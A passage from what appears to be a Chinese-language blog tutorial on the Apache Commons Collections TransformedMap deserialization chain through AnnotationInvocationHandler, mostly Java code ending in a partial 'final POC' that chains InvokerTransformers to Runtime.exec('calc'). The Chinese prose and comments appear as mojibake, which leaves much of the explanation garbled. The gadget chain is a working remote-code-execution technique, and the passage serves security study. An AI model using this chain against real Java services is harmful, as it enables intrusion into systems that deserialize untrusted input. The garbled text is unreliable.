        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
        * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
        * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"tm.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘æ¼æ´</span>

    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åŸæœ¬ä»¥ä¸ºæˆåŠŸäº†ï¼Œç»“æœå‘ç°ï¼š<code>MapEntry</code>ä¸èƒ½è¢«åºåˆ—åŒ–<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225703306.png" alt="image-20210731225703306" loading="lazy"></p>
<p>å»æ‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225956030.png" alt="image-20210731225956030" loading="lazy"></p>
<h4 id="ç¬¬å…­æ­¥ï¼š-AnnotationInvocationHandler"><a href="#ç¬¬å…­æ­¥ï¼š-AnnotationInvocationHandler" class="headerlink" title="ç¬¬å…­æ­¥ï¼š AnnotationInvocationHandler"></a>ç¬¬å…­æ­¥ï¼š AnnotationInvocationHandler</h4><p>è™½ç„¶åœ¨ç¬¬äº”æ­¥æˆ‘ä»¬ä¸èƒ½åºåˆ—åŒ–ï¼Œä½†å¹¸è¿çš„æ˜¯<code>AnnotationInvocationHandler</code>ä¸­å‡ºç°äº†æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731220804329.png" alt="image-20210731220804329" loading="lazy"></p>
<p><code>AnnotationInvocationHandler</code>æ‹¥æœ‰è‡ªå·±çš„<code>readObject()</code>æ–¹æ³•ï¼Œä¸”æ–¹æ³•ä¸­æ¶‰åŠåˆ°äº†<code>Map</code>çš„æ“ä½œï¼Œè®©æˆ‘ä»¬æ¥è¯¦ç»†åˆ†æä¸€ä¸‹ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        var1<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">AnnotationType</span> var2 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token comment">//var2ä»£è¡¨AnnotationTypeï¼ˆæ³¨é‡Šç±»å‹ï¼‰ -ã€‹ ä¸ºç©º</span>

        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            var2 <span class="token operator">=</span> <span class="token class-name">AnnotationType</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ ¹æ®ã€this.typeã€‘ç»™var2èµ‹å€¼ä¸ºä¸€ä¸ªå®ä¾‹</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalArgumentException</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidObjectException</span><span class="token punctuation">(</span><span class="token string">"Non-annotation type in annotation serial stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token class-name">Map</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//var3ä¸ºvar2 Annotationä¸­çš„[value:ElementType]</span>
        <span class="token class-name">Iterator</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//*****var4ä¼šç›´æ¥å°†memberValuesè‡ªèº«ä½œä¸ºparentä¼ å…¥ï¼Œå’Œç¬¬äº”æ­¥æˆ‘ä»¬è‡ªå·±æ„é€ çš„ä¸€æ¨¡ä¸€æ ·ï¼ï¼ï¼å¦‚æœæ²¡çœ‹æ‡‚çš„ï¼Œå»ºè®®çœ‹ç¬¬äº”æ­¥ä»”ç»†é˜…è¯»ã€‚</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å¦‚æœvar4ä¸­è¿˜æœ‰ä¸‹ä¸€ä¸ªkey-Valueå¯¹</span>
            <span class="token class-name">Entry</span> var5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–ä¸‹ä¸€ä¸ªkey-valueå¯¹ï¼Œå¹¶èµ‹å€¼ç»™var5</span>
            <span class="token class-name">String</span> var6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–var5çš„key</span>
            <span class="token class-name">Class</span> var7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨var3ä¸­æŸ¥çœ‹æœ‰æ²¡æœ‰è¿™ä¸ªkeyï¼ŒæŠŠç»“æœèµ‹å€¼ç»™var7</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var7 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å¦‚æœvar3ä¸­æœ‰è¿™ä¸ªkey</span>
                <span class="token class-name">Object</span> var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–è¿™ä¸ªkey-Valueå¯¹ä¸­çš„value</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var7<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>var8 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">//*****å¦‚æœvar7ä¸æ˜¯var8ï¼ˆvalueï¼‰çš„å®ä¾‹ï¼Œè€Œä¸” valueä¸æ˜¯ExceptionProxyçš„å®ä¾‹ï¼Œcall var5(Map)çš„setValue()æ–¹æ³•</span>
                    var5<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>var8<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> var8 <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬çœ‹åˆ°äº†ç†Ÿæ‚‰çš„<code>this.memberValues.entrySet().iterator();</code>ï¼Œåœ¨åé¢è¿˜æœ‰<code>setValue()</code>ï¼Œè¿™å·²ç»è¶³å¤Ÿæˆ‘ä»¬åˆ©ç”¨äº†ã€‚</p>
<p>ä¸Šé¢ä»£ç <code>comment</code>ä¸­çš„<code>ã€this.typeã€‘</code>å’Œ<code>ã€this.memberValuesã€‘</code>éƒ½æ˜¯å¯æ§çš„ -ã€‹ åœ¨constructorä¸­å¯ä»¥ä¼ å…¥ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span><span class="token punctuation">></span></span> var1<span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">isAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var3<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token class-name">Annotation</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> var1<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues <span class="token operator">=</span> var2<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationFormatError</span><span class="token punctuation">(</span><span class="token string">"Attempt to create proxy for a non-annotation type."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>memberValues</code>æˆ‘ä»¬èµ‹å€¼ä¸º<code>TransformedMap.decorate()</code>çš„è¿”å›å€¼ï¼Œé‚£<code>type</code>å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å‘ç°<code>type</code>æ˜¯ä¸€ç§<code>Annotation</code>ï¼ˆæ³¨é‡Šï¼‰ï¼Œå¦‚æœæœ‰åŒå­¦ç”¨è¿‡<code>SpringBootæˆ–Spring</code>çš„è¯ï¼Œå°±ä¼šç†è§£<code>Annotation</code>çš„æ„ä¹‰ã€‚æ‰€ä»¥æ­¤å¤„æˆ‘ä»¬æ˜¯è¦ä¼ ä¸€ä¸ªAnnotationçš„Classè¿‡å»ã€‚å†çœ‹<code>readObject()</code>ä¸­çš„é€»è¾‘ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
var2 <span class="token operator">=</span> <span class="token class-name">AnnotationType</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ ¹æ®ã€this.typeã€‘ç»™var2èµ‹å€¼ä¸ºä¸€ä¸ªAnnotationå®ä¾‹ï¼ˆå®é™…ä¼šè·å–åˆ°æ³¨è§£çš„å„ç§å±æ€§ï¼ŒåŒ…æ‹¬æ³¨è§£å…ƒç´ ï¼Œæ³¨è§£å…ƒç´ çš„é»˜è®¤å€¼ï¼Œç”Ÿå‘½å‘¨æœŸï¼Œæ˜¯å¦ç»§æ‰¿ç­‰ç­‰ã€‚ï¼‰</span>
      <span class="token class-name">Map</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">memberTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//var3ä¸ºvar2 Annotationä¸­çš„[value:ElementType]</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token class-name">Entry</span> var5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è·å–ä¸‹ä¸€ä¸ªentry</span>
          <span class="token class-name">String</span> var6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–var5çš„key</span>
          <span class="token class-name">Class</span> var7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨var3 memberTypesä¸­æŸ¥çœ‹æœ‰æ²¡æœ‰è¿™ä¸ªkeyï¼ŒæŠŠç»“æœèµ‹å€¼ç»™var7</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>var7 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å¦‚æœvar3 memberTypesä¸­æœ‰è¿™ä¸ªkey</span>
              <span class="token class-name">Object</span> var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–è¿™ä¸ªkey-Valueå¯¹ä¸­çš„value</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var7<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>var8 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token comment">//*****å¦‚æœvar7ä¸æ˜¯var8ï¼ˆvalueï¼‰çš„å®ä¾‹ï¼Œè€Œä¸” valueä¸æ˜¯ExceptionProxyçš„å®ä¾‹ï¼Œè§¦å‘æ¼æ´</span>
                  var5<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AnnotationTypeMismatchExceptionProxy</span><span class="token punctuation">(</span>var8<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"["</span> <span class="token operator">+</span> var8 <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setMember</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">members</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬ä¼ å…¥çš„è¿™ä¸ªtypeéœ€è¦æœ‰<code>memberTypes</code>ï¼Œä¸”æˆ‘ä»¬çš„<strong>map</strong>ä¸­çš„keyå¿…é¡»è¦å’Œ<code>memberTypes</code>çš„keyä¿æŒ<strong>ä¸€è‡´ã€‚</strong></p>
<p>è·Ÿè¸ª<code>Annotation</code>è¿™ä¸ª<code>Class</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ‰€æœ‰<code>Annotation</code>çš„<code>classã€‚</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731231645279.png" alt="image-20210731231645279" loading="lazy"></p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•åˆ†æä¸€ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Documented</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span>
<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>ANNOTATION_TYPE<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Target</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ElementType</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤å¤„<code>Target</code>çš„<code>memberTypes</code>å°±æ˜¯ <code>[value:ElementType]</code> =ã€‹ <strong>key-value</strong>çš„å½¢å¼ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Documented</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span>
<span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>ANNOTATION_TYPE<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Retention</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">RetentionPolicy</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ­¤å¤„<code>Retention</code>çš„<code>memberTypes</code>å°±æ˜¯ <code>[value:RetentionPolicy]</code> =ã€‹ <strong>key-value</strong>çš„å½¢å¼`ã€‚</p>
<p>è¿™äº›<code>Annotation</code>çš„å…ƒæ³¨è§£éƒ½å¯ä»¥é€šè¿‡<code>@</code>ç¬¦å·æ¥è°ƒç”¨ï¼Œä¾‹å¦‚<code>@Target</code><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731232549977.png" alt="image-20210731232549977" loading="lazy"></p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¼ å…¥<code>Target.class</code>æˆ–è€…<code>Retention.class</code>, <code>map</code>çš„<code>key</code>å€¼ä¸º<code>value</code>ã€‚</p>
<h4 id="æœ€ç»ˆPOC"><a href="#æœ€ç»ˆPOC" class="headerlink" title="æœ€ç»ˆPOC"></a>æœ€ç»ˆPOC</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransformedMapExploit</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
        * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
        * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"anyContent"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> myMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//malicious map</span>

        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åå°„è·å–è¯¥ç±»</span>
        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aConstructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–æ„é€ æ–¹æ³•</span>
